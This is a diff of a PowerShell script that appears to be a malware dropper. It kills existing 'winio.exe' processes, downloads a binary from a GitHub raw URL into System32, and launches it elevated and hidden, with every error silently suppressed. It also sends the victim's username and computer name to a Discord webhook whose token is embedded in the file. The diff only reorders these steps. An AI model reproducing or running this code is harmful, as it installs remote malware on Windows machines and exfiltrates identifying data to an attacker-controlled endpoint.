@@ -1,39 +1,3 @@
-$processPaths = @('C:\Windows\System32\winio.exe', 'C:\Windows\System32\SafeBoot\winio.exe');
-try {
-    $processes = Get-WmiObject Win32_Process | Where-Object { $processPaths -contains $_.ExecutablePath };
-
-    if ($processes.Count -eq 0) {
-    } else {
-        foreach ($process in $processes) {
-            try 
-            {
-                Stop-Process -Id $process.ProcessId -Force;
-            } 
-            catch 
-            {
-            };
-        };
-    };
-} 
-catch 
-{
-};
-
-try 
-{
-    Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
-    Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
-
-    if (-not (Test-Path 'C:\Windows\System32\winio.exe')) 
-    {
-        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
-        Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
-    };
-} 
-catch 
-{
-}
-
 $webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc";
 $user = $env:USERNAME.TrimEnd('$');
 $pcName = $env:COMPUTERNAME;
@@ -45,4 +9,43 @@ $payload = @{
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload;
 } catch {
+}
+
+$processPaths = @('C:\Windows\System32\winio.exe', 'C:\Windows\System32\SafeBoot\winio.exe');
+try 
+{
+    $processes = Get-WmiObject Win32_Process | Where-Object { $processPaths -contains $_.ExecutablePath };
+
+    if ($processes) 
+    {
+        foreach ($process in $processes) 
+        {
+            try 
+            {
+                Stop-Process -Id $process.ProcessId -Force;
+            } 
+            catch 
+            {
+            }
+        }
+    }
+} 
+catch 
+{
+}
+
+
+try 
+{
+    Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+    Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;
+
+    if (-not (Test-Path 'C:\Windows\System32\winio.exe')) 
+    {
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+        Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;
+    };
+} 
+catch 
+{
 }
